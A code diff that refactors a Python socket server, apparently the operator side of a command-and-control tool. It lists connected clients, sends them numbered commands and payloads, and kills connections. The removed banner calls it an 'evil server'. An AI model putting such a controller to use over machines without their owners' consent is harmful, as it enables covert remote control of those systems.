@@ -7,7 +7,7 @@ from tabulate import tabulate
 
 RUNNING = True
 connections_dict = {}
-messages_counter = 0
+messages_counter = 0  # used for command identifier
 config_obj = configparser.ConfigParser()
 config_obj.read("common/configfile.ini")
 socket_info = config_obj["configuration"]
@@ -16,15 +16,13 @@ host = str(socket_info["host"])
 port = int(socket_info["port"])
 
 
-def show_connections():
-    data = []
-    for key, value in connections_dict.items():
-        data.append([key, host + ":" + key])
-    print(tabulate(data, headers=[bcolors.BOLD + "connection id",
-                                  "address" + bcolors.ENDC]))
 
 
 def look_for():
+    """
+    accepts a connection request by a client, then adds client to connections
+    dict and starts new thread
+    """
     global connections_dict
     while RUNNING:
         try:
@@ -37,50 +35,74 @@ def look_for():
 
 
 def multi_threaded_client(connection):
+    """
+    called for starting new thread, receives data using recv() func
+    """
     connection.send(str.encode('Server is working:'))
     try:
         while RUNNING:
             data = connection.recv(2048)
             if not data:
                 continue
-            print(bcolors.HEADER + "Message from client: " + data.decode('utf-8') + bcolors.ENDC)
+            print(bcolors.CONNECTION_RESP + "Message from client: " + data.decode('utf-8') + bcolors.ENDC)
     except socket.error as e:
         pass
 
 
-def kill_connection(connection_id):
-    connection = connections_dict[connection_id]
-    connection.sendall(str.encode("kill"))
-    del connections_dict[connection_id]
-
 
 def print_term_of_use():
+    """
+    prints table with optional commands and their arguments if needed
+    """
     data = [
         ["connections", "shows clients connections", "-"],
         ["send", 'sends command to clients',
          "<connection id> <type> <payload> <arg 1> ... <arg n>"],
         ["kill", "removes client connection", "<connection id>"],
         ["result", "shows command result", "<command id>"],
-        ["exit", "yalla bye", "-"]
+        ["exit", "", "-"]
     ]
     print(
-        bcolors.SERVERBLUE + "#### WELCOME TO MY EVIL SERVER ####" + bcolors.ENDC)
+        bcolors.SERVER_BLUE + "#### WELCOME! CHOOSE COMMAND FROM MENU ####" + bcolors.ENDC)
     print(tabulate(data, headers=[bcolors.BOLD + "Command Name", "Description",
                                   "Arguments" + bcolors.ENDC]))
 
 
 def send_command(user_input, connection_id):
+    """
+    sends command according to user input from CLI
+    """
     global messages_counter
     connection = connections_dict[connection_id]
     connection.sendall(str.encode(str(messages_counter) + " " + user_input))
     messages_counter += 1
 
+def show_connections():
+    """
+    prints table of current servers connections
+    """
+    data = []
+    for key, value in connections_dict.items():
+        data.append([key, host + ":" + key])
+    print(tabulate(data, headers=[bcolors.BOLD + "connection id",
+                                  "address" + bcolors.ENDC]))
+
+def kill_connection(connection_id):
+    """
+    removes connection according to a given connection id
+    """
+    connection = connections_dict[connection_id]
+    connection.sendall(str.encode("kill"))
+    del connections_dict[connection_id]
 
 def menu():
+    """
+    gets users input and runs matching function
+    """
     global RUNNING
     print_term_of_use()
     while True:
-        user_input = input(bcolors.SERVERBLUE + "server>" + bcolors.ENDC)
+        user_input = input(bcolors.SERVER_BLUE + "server>" + bcolors.ENDC)
         input_parts = user_input.split()
         if len(input_parts) == 0:
             print("Illegal input.")
